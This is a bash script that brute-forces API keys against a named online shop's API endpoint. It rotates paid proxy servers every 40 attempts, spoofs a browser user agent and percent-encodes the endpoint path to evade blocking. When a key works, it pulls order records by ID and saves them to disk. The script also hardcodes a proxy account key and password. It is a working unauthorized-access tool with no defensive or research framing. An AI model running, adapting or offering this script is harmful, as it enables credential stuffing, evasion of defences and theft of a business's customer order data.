#!/bin/bash
set -u
KEY=C413ED6D
PWD=344F550A6F8B
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36"
BASE=https://xuxin66.top/shop
CK=/tmp/xux_key_ck.txt
OUT=/tmp/xux_key_out
KEYS=/tmp/xux_apikeys.txt
mkdir -p "$OUT"
refresh(){
  RESP=$(curl -s --max-time 15 "https://share.proxy.qg.net/get?key=${KEY}&num=1" || true)
  SERVER=$(python3 -c "import json,sys,os; 
try:
 d=json.loads(sys.argv[1]);
 print(d['data'][0]['server'] if d.get('code')=='SUCCESS' and d.get('data') else '')
except: print('')" "$RESP")
  if [[ -z "$SERVER" ]]; then
    RESP=$(curl -s --max-time 15 "https://share.proxy.qg.net/query?key=${KEY}" || true)
    SERVER=$(python3 -c "import json,sys
try:
 d=json.loads(sys.argv[1]);
 print(d['data'][0]['server'] if d.get('code')=='SUCCESS' and d.get('data') else '')
except: print('')" "$RESP")
  fi
  if [[ -n "$SERVER" ]]; then
    PROXY_URL="http://${KEY}:${PWD}@${SERVER}"
    echo "PROXY_URL=$PROXY_URL" > /data/config/proxy.env
    echo "refreshed $SERVER"
  else
    source /data/config/proxy.env
    echo "reuse $PROXY_URL"
  fi
  source /data/config/proxy.env
}
c(){ curl -sk -x "$PROXY_URL" -c "$CK" -b "$CK" --max-time 12 -A "$UA" -e "$BASE/" -H "X-Requested-With: XMLHttpRequest" "$@"; }
refresh
c "$BASE/" -o /dev/null -w "HOME=%{http_code}:%{size_download}\n"
echo -n "wrong: "; c "$BASE/%61pi.php?act=tools&key=wrongkey"; echo
i=0; hits=0; empty=0; bad=0
while IFS= read -r k; do
  [[ -z "$k" ]] && continue
  i=$((i+1))
  if (( i % 40 == 1 )); then refresh; c "$BASE/" -o /dev/null >/dev/null; fi
  ek=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$k")
  r=$(c "$BASE/%61pi.php?act=tools&key=${ek}&limit=1")
  if [[ -z "$r" ]]; then empty=$((empty+1)); continue; fi
  if echo "$r" | grep -q "API对接密钥错误"; then bad=$((bad+1)); 
  elif echo "$r" | grep -q "确保各项不能为空"; then :
  else
    echo "KEYHIT $k => $r"
    printf "%s\n%s\n" "$k" "$r" > "$OUT/keyhit.txt"
    hits=$((hits+1))
    for oid in 1 100 1000 5000 10000 11000 11240; do
      rr=$(c "$BASE/%61pi.php?act=search&id=$oid&key=$ek")
      echo "search $oid => ${rr:0:300}"
      echo "$rr" > "$OUT/search_$oid.json"
    done
    break
  fi
  if (( i % 40 == 0 )); then echo "progress $i bad=$bad empty=$empty hits=$hits"; fi
done < "$KEYS"
echo "DONE tested=$i hits=$hits bad=$bad empty=$empty"
